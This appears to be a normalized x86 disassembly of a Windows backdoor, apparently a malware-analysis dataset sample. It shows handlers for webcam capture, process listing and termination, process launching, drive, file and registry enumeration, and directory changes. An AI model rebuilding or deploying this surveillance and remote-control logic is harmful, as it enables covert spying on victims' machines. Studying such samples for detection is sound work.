push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x210 ]
push eax
push 0x104
movsb [ edi ] [ esi ]
call [ GetTempPathA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sprintf
push [ ebp + 0x8 ]
call sub_4062ee
mov esi eax
lea eax [ ebp - 0x410 ]
push esi
push rw-data
push eax
call sprintf
add esp 0x20
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_406546
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call strncmp
add esp 0x14
test eax eax
je r-xdata
push esi
call free
pop ecx
lea eax [ ebp - 0x410 ]
push esi
push eax
call strcat
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
call remove
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
call remove
test eax eax
pop ecx
jne r-xdata
push esi
call free
pop ecx
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x410 ]
push eax
call _strdup
mov esi eax
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
sub_4062ee
push ebp
mov ebp esp
sub esp 0x38c
push esi
push edi
xor edi edi
push edi
push [ rw-data ]
push edi
push edi
push 0x1
push 0x1
push edi
push edi
push edi
push rw-data
push rw-data
push edi
call [ CreateWindowExA@IAT ]
mov esi eax
cmp esi edi
mov [ ebp - 0xc ] esi
je r-xdata
lea eax [ ebp - 0x288 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
push 0x1
push esi
push 0x78
push 0xa0
push edi
push edi
push 0x40000000
push rw-data
call capCreateCaptureWindowA
cmp eax edi
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
call [ DestroyWindow@IAT ]
push ebx
mov ebx [ IsWindow@IAT ]
push eax
call ebx
mov esi [ SendMessageA@IAT ]
test eax eax
je r-xdata
xor eax eax
push edi
push [ rw-data ]
push 0x40a
push [ ebp - 0x4 ]
call esi
jmp r-xdata
push [ rw-data ]
push rw-data
mov [ ebp - 0x8 ] 0xa
cmp eax edi
je r-xdata
push 0x64
call _sleep
cmp [ ebp - 0x24 ] edi
pop ecx
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
push 0x2c
push 0x40e
push [ ebp - 0x4 ]
call esi
push [ rw-data ]
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
add esp 0xc
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
dec [ ebp - 0x8 ]
jne r-xdata
push edi
push edi
push 0x43d
push [ ebp - 0x4 ]
call esi
jmp r-xdata
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
push edi
push edi
push 0x41e
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x38c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x38c ]
push eax
lea eax [ ebp - 0x148 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x148 ]
push rw-data
push eax
call fopen
add esp 0x18
cmp eax edi
je r-xdata
push edi
push edi
push 0x40b
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x148 ]
push eax
push rw-data
jmp r-xdata
push eax
call fclose
pop ecx
lea eax [ ebp - 0x148 ]
push eax
call [ DeleteFileA@IAT ]
push [ rw-data ]
lea eax [ ebp - 0x148 ]
push eax
call sub_40cbb5
lea eax [ ebp - 0x148 ]
push rw-data
push eax
call fopen
mov esi eax
push [ esi + 0x10 ]
call _filelength
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x288 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push [ rw-data ]
lea eax [ ebp - 0x148 ]
push eax
lea eax [ ebp - 0x288 ]
push [ rw-data ]
push rw-data
push eax
call sprintf
add esp 0x14
jmp r-xdata
push [ ebp - 0x4 ]
mov esi [ DestroyWindow@IAT ]
call esi
push [ ebp - 0xc ]
call esi
pop ebx
jmp r-xdata
push esi
call fclose
pop ecx
jmp r-xdata
sub_406546
push ebp
mov ebp esp
sub esp 0x364
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi ] 0x0
je r-xdata
xor eax eax
lea eax [ ebp - 0x260 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x260 ]
push esi
push eax
lea eax [ ebp - 0x364 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x364 ]
push eax
call _strdup
mov esi eax
push rw-data
push esi
mov [ ebp - 0xc ] esi
call fopen
add esp 0x1c
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push esi
call _stat
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
push rw-data
call _strdup
pop ecx
mov ebx eax
jmp r-xdata
mov edi [ ebp - 0x44 ]
push 0x5c
push esi
mov [ ebp - 0x1c ] edi
call strrchr
inc eax
push eax
call _strdup
mov esi eax
push esi
mov [ ebp - 0x18 ] esi
call strlen
push eax
push esi
call sub_40267e
push esi
call strlen
push eax
push esi
call sub_40c768
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x34 ]
push 0xa
push eax
push 0x0
call _itoa
lea esi [ edi + 0x1 ]
push esi
call malloc
mov ebx eax
add esp 0x34
test ebx ebx
jne r-xdata
push 0x1
call exit
xor esi esi
cmp [ ebp - 0xc ] esi
je r-xdata
push esi
push 0x0
push ebx
call memset
push [ ebp - 0x4 ]
push edi
push 0x1
push ebx
call fread
push eax
push ebx
mov [ rw-data ] eax
call sub_40267e
push [ rw-data ]
push ebx
call sub_40c768
push ebx
mov [ ebp + 0x8 ] eax
call free
push [ ebp - 0x4 ]
call fclose
push [ rw-data ]
call strlen
push [ ebp + 0x8 ]
mov edi eax
call strlen
push [ ebp - 0x8 ]
add edi eax
call strlen
add esp 0x40
mov esi rw-data
add edi eax
push esi
call strlen
add edi eax
lea eax [ ebp - 0x34 ]
push eax
call strlen
lea edi [ edi + eax + 0x9 ]
push edi
call malloc
add esp 0xc
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
push 0x1
call exit
cmp [ ebp - 0x8 ] esi
je r-xdata
push [ ebp - 0xc ]
call free
pop ecx
push edi
push 0x0
push eax
call memset
push [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x8 ]
push esi
push [ rw-data ]
push rw-data
push edi
push [ ebp - 0x14 ]
call _snprintf
add esp 0x2c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
call exit
cmp [ ebp - 0x18 ] esi
je r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
and [ ebp + 0x8 ] 0x0
push [ ebp + 0x8 ]
call free
pop ecx
push ebx
call strlen
mov [ rw-data ] eax
pop ecx
mov eax ebx
jmp r-xdata
push [ ebp - 0x18 ]
call free
pop ecx
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0xa
jl r-xdata
mov al [ esi ]
cmp al 0x30
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x14 ]
push rw-data
call sub_402b19
mov esi eax
add esp 0x14
test esi esi
mov [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x14 ]
call free
mov eax [ ebp - 0x1c ]
pop ecx
cmp [ ebp - 0x4 ] eax
jne r-xdata
cmp al 0x39
jg r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x15c ]
push rw-data
push eax
call sprintf
add esp 0xc
test esi esi
je r-xdata
and [ ebp - 0x4 ] 0x0
push rw-data
push esi
call strtok
push eax
call _strdup
mov edi eax
add esp 0xc
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov ebx rw-data
add eax esi
push ebx
push eax
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push rw-data
call printf
pop ecx
push edi
call atoi
push edi
mov [ ebp - 0x4 ] eax
call strlen
inc eax
push edi
mov [ ebp - 0x10 ] eax
call free
add esp 0xc
jmp r-xdata
push [ ebp - 0x44 ]
lea eax [ ebp - 0x15c ]
push [ ebp - 0xc ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x15c ]
push eax
call _strdup
add esp 0x14
mov ebx eax
push ebx
call strlen
add esi eax
push 0x2
push rw-data
push esi
call strncmp
add esp 0x10
test eax eax
jne r-xdata
push esi
call free
pop ecx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
push [ ebp - 0x20 ]
call free
pop ecx
jmp r-xdata
inc esi
inc esi
cmp [ esi ] 0x0
lea eax [ esi + 0x1 ]
je r-xdata
push esi
call strlen
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push esi
call sub_40c89c
push [ ebp - 0x10 ]
mov edi eax
push edi
call sub_40267e
add esp 0x14
cmp [ edi ] 0x0
mov eax edi
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
push edi
call sub_402cf7
test edi edi
pop ecx
mov ebx eax
je r-xdata
mov cl [ eax ]
cmp cl 0xd
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
test esi esi
je r-xdata
push edi
call free
pop ecx
jmp r-xdata
and [ eax ] 0x0
cmp cl 0xa
jne r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_4068f6
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0x8 ]
call atoi
mov esi eax
pop ecx
test esi esi
jl r-xdata
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
cmp esi 0x64
jg r-xdata
push esi
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
add esp 0xc
mov [ rw-data ] esi
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_406964
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0x8 ]
call atoi
mov esi eax
pop ecx
cmp esi 0x9
ja r-xdata
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call sprintf
add esp 0xc
mov [ rw-data ] esi
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
sub_4069ce
push ebp
mov ebp esp
sub esp 0xf0c
push ebx
push esi
xor ebx ebx
push edi
mov edi [ SendMessageA@IAT ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xf0c ] bl
mov [ ebp - 0x50c ] bl
mov [ ebp - 0x70c ] bl
mov [ ebp - 0x10c ] bl
mov [ ebp - 0x4 ] ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xa
jl r-xdata
lea eax [ ebp - 0x70c ]
push eax
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x50c ]
push [ ebp - 0x4 ]
push rw-data
push eax
call sprintf
add esp 0x14
inc [ ebp - 0x8 ]
push ebx
push [ rw-data ]
push ebx
push ebx
push 0x1
push 0x1
push ebx
push ebx
push ebx
push rw-data
push rw-data
push ebx
call [ CreateWindowExA@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
lea eax [ ebp - 0x70c ]
push 0x1ff
push eax
lea eax [ ebp - 0x10c ]
push 0xff
push eax
push [ ebp - 0x4 ]
call capGetDriverDescriptionA
test eax eax
je r-xdata
push [ rw-data ]
lea eax [ ebp - 0x50c ]
push [ ebp - 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x50c ]
push eax
lea eax [ ebp - 0xf0c ]
push eax
call strcat
lea eax [ ebp - 0xf0c ]
push eax
call _strdup
mov esi eax
push esi
call strlen
add esp 0x20
mov [ rw-data ] eax
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x50c ]
push eax
lea eax [ ebp - 0xf0c ]
push eax
call strcat
pop ecx
pop ecx
push 0x1
push eax
push 0x78
push 0xa0
push ebx
push ebx
push 0x40000000
push rw-data
call capCreateCaptureWindowA
mov esi eax
cmp esi ebx
je r-xdata
push [ ebp - 0xc ]
call [ DestroyWindow@IAT ]
push esi
call [ IsWindow@IAT ]
test eax eax
je r-xdata
xor eax eax
push ebx
push [ ebp - 0x4 ]
push 0x40a
push esi
call edi
jmp r-xdata
lea eax [ ebp - 0x50c ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
push esi
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x50c ]
push rw-data
push eax
call strcat
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov [ rw-data ] eax
jmp r-xdata
push ebx
push ebx
push 0x40b
push esi
call edi
push esi
mov esi [ DestroyWindow@IAT ]
call esi
push [ ebp - 0xc ]
call esi
jmp r-xdata
sub_406b8c
push ebp
mov ebp esp
sub esp 0x488
push ebx
push esi
lea eax [ ebp - 0x24 ]
push edi
push eax
mov [ ebp - 0x24 ] 0x20
call [ GlobalMemoryStatus@IAT ]
mov eax [ ebp - 0x10 ]
shr eax 0x14
push eax
mov eax [ ebp - 0x14 ]
shr eax 0x14
push eax
mov eax [ ebp - 0x1c ]
push [ ebp - 0x20 ]
shr eax 0x14
push eax
lea eax [ ebp - 0x488 ]
push rw-data
push eax
call sprintf
mov esi [ lstrcatA@IAT ]
add esp 0x18
mov [ ebp - 0x4 ] 0x1a
push 0x41
pop ebx
push rw-data
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x88 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x88 ]
push eax
call [ GetDriveTypeA@IAT ]
mov edi eax
lea eax [ ebp - 0x88 ]
push rw-data
push eax
call esi
mov eax edi
sub eax 0x0
je r-xdata
lea eax [ ebp - 0x488 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x488 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x88 ] 0x0
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x488 ]
push eax
call esi
inc ebx
dec [ ebp - 0x4 ]
jne r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call esi
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sub_406cbb
push ebp
mov ebp esp
mov eax 0x350c
call sub_418fe0
mov al [ rw-data ]
push esi
push edi
mov [ ebp - 0x350c ] al
mov ecx 0x7ff
xor eax eax
lea edi [ ebp - 0x350b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x150c ]
push 0x1000
push eax
call EnumProcesses
test eax eax
je r-xdata
lea eax [ ebp - 0x350c ]
push eax
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
shr eax 0x2
je r-xdata
push ebx
lea esi [ ebp - 0x150c ]
mov ebx eax
add esi 0x4
dec ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push edi
call EnumProcessModules
test eax eax
je r-xdata
push [ esi ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
pop ebx
push edi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x10c ]
push 0x104
push eax
push [ ebp - 0x8 ]
push edi
call GetModuleFileNameExA
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x50c ]
push [ esi ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x50c ]
push eax
call strlen
push eax
lea eax [ ebp - 0x50c ]
push eax
lea eax [ ebp - 0x350c ]
push eax
call strncat
add esp 0x20
sub_406dc7
push esi
push [ esp + 0x8 ]
call atol
pop ecx
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
test eax eax
jne r-xdata
push 0x0
push eax
call [ TerminateProcess@IAT ]
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_406e19
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40c987
mov ebx eax
xor esi esi
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call memset
add esp 0x1c
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x44
mov [ ebp - 0x28 ] 0x81
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
push ebx
push esi
mov [ ebp - 0x24 ] si
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
pop ebx
leave
retn
sub_406e9b
push ebp
mov ebp esp
sub esp 0x304
push esi
lea eax [ ebp - 0x104 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x104 ]
push 0x104
push eax
call [ DoEnvironmentSubstA@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
test eax eax
lea eax [ ebp - 0x104 ]
jne r-xdata
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x304 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x304 ]
push eax
call _strdup
add esp 0x10
jmp r-xdata
push [ rw-data ]
call _strdup
pop ecx
mov esi [ rw-data ]
lea eax [ ebp - 0x104 ]
push eax
call sub_40c987
test esi esi
pop ecx
mov [ rw-data ] eax
je r-xdata
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
leave
retn
push esi
call free
pop ecx
sub_406f4e
sub esp 0x108
push ebx
push ebp
push esi
push edi
push [ esp + 0x11c ]
call sub_40c987
mov esi eax
mov [ esp ] rw-data
push esi
call fopen
mov ebp eax
pop ecx
test ebp ebp
pop ecx
jne r-xdata
push 0x1
call malloc
mov esi eax
pop ecx
test esi esi
jne r-xdata
push esi
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sprintf
lea eax [ esp + 0x20 ]
push eax
call _strdup
mov esi eax
push esi
call strlen
mov [ rw-data ] eax
add esp 0x14
mov eax esi
jmp r-xdata
and [ esi ] 0x0
and [ esp + 0x10 ] 0x0
push 0x1
call exit
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn
push ebp
call _filbuf
pop ecx
mov ebx eax
mov eax [ ebp ]
movzx ebx [ eax ]
inc eax
mov [ ebp ] eax
jmp r-xdata
push esi
call strlen
push esi
mov [ rw-data ] eax
call _strdup
pop ecx
mov edi eax
test esi esi
pop ecx
je r-xdata
cmp ebx 0x20
jl r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax edi
push esi
call free
pop ecx
cmp ebx 0x81
jl r-xdata
cmp ebx 0x7e
jg r-xdata
cmp [ esp + 0x10 ] 0xa0
jle r-xdata
cmp ebx 0xc8
jg r-xdata
push esi
call _msize
inc eax
push eax
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
dec [ ebp + 0x4 ]
js r-xdata
and [ esp + 0x10 ] 0x0
push esi
call _msize
inc eax
inc eax
push eax
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
dec [ ebp + 0x4 ]
js r-xdata
push 0x1
call exit
push ebx
jmp r-xdata
push 0x1
call exit
push esi
push rw-data
push esi
call sprintf
add esp 0xc
jmp r-xdata
push ebp
call _filbuf
pop ecx
mov edi eax
mov eax [ ebp ]
movzx edi [ eax ]
inc eax
mov [ ebp ] eax
jmp r-xdata
push esi
push rw-data
push esi
call sprintf
add esp 0x10
inc [ esp + 0x10 ]
cmp edi 0x20
jl r-xdata
cmp edi 0xfe
jg r-xdata
cmp edi 0x41
jl r-xdata
cmp edi 0x7e
jg r-xdata
push esi
call _msize
inc eax
inc eax
push eax
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push esi
call _msize
inc eax
push eax
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x1
call exit
push edi
push ebx
push esi
push rw-data
push esi
call sprintf
add esp 0x14
add [ esp + 0x10 ] 0x2
jmp r-xdata
push 0x1
call exit
push edi
sub_407166
push ebp
mov ebp esp
sub esp 0x2d4
push ebx
push esi
push edi
push 0x14
pop ecx
mov esi rw-data
lea edi [ ebp - 0x60 ]
mov ax [ rw-data ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x9c
mov esi rw-data
lea edi [ ebp - 0x2d4 ]
mov [ ebp - 0x2 ] ax
[ edi ] [ esi ]
lea eax [ ebp - 0x2d4 ]
push eax
movsb [ edi ] [ esi ]
call strlen
inc eax
push eax
call malloc
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x2d4 ]
push eax
call _strdup
mov esi eax
lea eax [ ebp - 0x60 ]
push eax
call sub_402cf7
lea ecx [ ebp - 0x2 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call strtok
add esp 0x10
and [ ebp - 0x8 ] 0x0
mov edi eax
push 0x1
call exit
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
push 0x3b
push esi
call strrchr
and [ eax ] 0x0
push esi
call sub_402cf7
add esp 0xc
mov edi eax
test esi esi
je r-xdata
push [ ebp - 0xc ]
call free
pop ecx
lea eax [ ebp - 0x2 ]
push eax
push 0x0
call strtok
inc [ ebp - 0x8 ]
pop ecx
pop ecx
mov edi eax
jmp r-xdata
push edi
call strlen
push esi
mov ebx eax
call strlen
lea eax [ ebx + eax + 0xa ]
push eax
push esi
call realloc
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push edi
call strlen
mov [ rw-data ] eax
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push esi
call free
pop ecx
test edi edi
je r-xdata
push 0x1
call exit
push rw-data
push esi
call strcat
push edi
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x18
sub_407295
push ebp
mov ebp esp
sub esp 0x214
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x104 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x3d
xor eax eax
pop ecx
lea edi [ ebp - 0xf6 ]
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x104 ]
push 0x104
push eax
call [ DoEnvironmentSubstA@IAT ]
cmp [ rw-data ] 0x6
lea eax [ ebp - 0x104 ]
push eax
jb r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ ebp - 0x214 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x214 ]
push eax
call sub_402cf7
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
leave
retn
sub_40731d
push ebp
mov ebp esp
mov eax 0x5a48
call sub_418fe0
mov al [ rw-data ]
push ebx
push esi
push edi
push 0x40
mov [ ebp - 0x648 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x647 ]
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
xor esi esi
mov [ ebp - 0x18 ] 0x104
stosb [ edi ]
mov [ ebp - 0x4 ] esi
call _strdup
push [ ebp + 0x8 ]
mov ebx eax
lea eax [ ebp - 0x5a48 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_407aa8
add esp 0x18
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push 0x20019
push esi
push eax
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x5a48 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push esi
push eax
lea eax [ ebp - 0x648 ]
push eax
push [ ebp - 0xc ]
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x4 ] esi
je r-xdata
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x8 ] esi
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x544 ]
push eax
lea eax [ ebp - 0x5a48 ]
push eax
call strcat
add esp 0x14
xor edi edi
cmp [ ebp - 0x4 ] esi
jbe r-xdata
lea eax [ ebp - 0x5a48 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x544 ]
push eax
lea eax [ ebp - 0x5a48 ]
push eax
call strcat
add esp 0x14
xor edi edi
cmp [ ebp - 0x8 ] esi
jbe r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x10 ] 0xff
push eax
push esi
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x144 ]
push eax
push edi
push [ ebp - 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] 0x3fff
push eax
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x144 ]
mov [ ebp - 0x1c ] 0x400
push eax
push edi
push [ ebp - 0xc ]
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x544 ]
push eax
lea eax [ ebp - 0x5a48 ]
push eax
call strcat
inc edi
pop ecx
cmp edi [ ebp - 0x4 ]
pop ecx
jb r-xdata
lea eax [ ebp - 0x144 ]
push eax
push ebx
lea eax [ ebp - 0x544 ]
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x544 ]
push eax
lea eax [ ebp - 0x5a48 ]
push eax
call strcat
inc edi
pop ecx
cmp edi [ ebp - 0x8 ]
pop ecx
jb r-xdata
mov eax [ ebp - 0x20 ]
cmp eax 0x8
ja r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp [ eax * 4 + jump_table_407633 ]
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0xa48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x544 ]
push eax
call sprintf
add esp 0x10
sub_407657
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor esi esi
push 0xf003f
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ebx 0x104
mov [ ebp - 0x8 ] esi
push ebx
push [ ebp + 0x10 ]
push esi
